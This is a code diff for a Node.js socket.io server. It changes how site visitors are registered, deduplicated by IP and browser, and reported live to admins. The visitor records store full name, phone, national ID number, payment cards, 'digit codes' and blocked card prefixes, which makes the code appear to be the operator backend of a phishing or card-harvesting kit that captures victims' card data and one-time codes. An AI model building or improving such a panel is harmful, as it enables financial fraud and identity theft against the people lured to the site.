@@ -133,38 +133,65 @@ io.on("connection", (socket) => {
 
   // Handle visitor registration
   socket.on("visitor:register", () => {
-    visitorCounter++;
     const visitorInfo = getVisitorInfo(socket);
     const { os, device, browser } = parseUserAgent(visitorInfo.userAgent);
 
-    const visitor = {
-      _id: `visitor_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
-      socketId: socket.id,
-      visitorNumber: visitorCounter,
-      createdAt: new Date().toISOString(),
-      isRead: false,
-      fullName: "",
-      phone: "",
-      idNumber: "",
-      apiKey: generateApiKey(),
-      ip: visitorInfo.ip,
-      country: visitorInfo.country,
-      city: "",
-      os,
-      device,
-      browser,
-      date: new Date().toISOString(),
-      blockedCardPrefixes: [],
-      page: "الصفحة الرئيسية",
-      data: {},
-      paymentCards: [],
-      digitCodes: [],
-      isBlocked: false,
-      isConnected: true,
-    };
+    // Check if this visitor already exists based on IP and browser
+    const existingVisitor = savedVisitors.find(v => 
+      v.ip === visitorInfo.ip && v.browser === browser && v.device === device
+    );
+
+    let visitor;
+    let isNewVisitor = false;
+
+    if (existingVisitor) {
+      // Update existing visitor with new socketId
+      visitor = {
+        ...existingVisitor,
+        socketId: socket.id,
+        isConnected: true,
+      };
+      // Update in savedVisitors
+      const index = savedVisitors.findIndex(v => v._id === existingVisitor._id);
+      if (index >= 0) {
+        savedVisitors[index] = visitor;
+      }
+      console.log(`Returning visitor reconnected: ${visitor._id}`);
+    } else {
+      // Create new visitor
+      visitorCounter++;
+      visitor = {
+        _id: `visitor_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
+        socketId: socket.id,
+        visitorNumber: visitorCounter,
+        createdAt: new Date().toISOString(),
+        isRead: false,
+        fullName: "",
+        phone: "",
+        idNumber: "",
+        apiKey: generateApiKey(),
+        ip: visitorInfo.ip,
+        country: visitorInfo.country,
+        city: "",
+        os,
+        device,
+        browser,
+        date: new Date().toISOString(),
+        blockedCardPrefixes: [],
+        page: "الصفحة الرئيسية",
+        data: {},
+        paymentCards: [],
+        digitCodes: [],
+        isBlocked: false,
+        isConnected: true,
+      };
+      savedVisitors.push(visitor);
+      isNewVisitor = true;
+      console.log(`New visitor registered: ${visitor._id}`);
+    }
 
     visitors.set(socket.id, visitor);
-    saveVisitorPermanently(visitor);
+    saveData();
 
     // Send confirmation to visitor
     socket.emit("successfully-connected", {
@@ -172,12 +199,14 @@ io.on("connection", (socket) => {
       pid: visitor._id,
     });
 
-    // Notify admins about new visitor (with isConnected: true)
+    // Notify admins
     admins.forEach((admin, adminSocketId) => {
-      io.to(adminSocketId).emit("visitor:new", { ...visitor, isConnected: true });
+      if (isNewVisitor) {
+        io.to(adminSocketId).emit("visitor:new", { ...visitor, isConnected: true });
+      } else {
+        io.to(adminSocketId).emit("visitor:reconnected", { visitorId: visitor._id, socketId: socket.id });
+      }
     });
-
-    console.log(`Visitor registered: ${visitor._id}`);
   });
 
   // Handle page enter
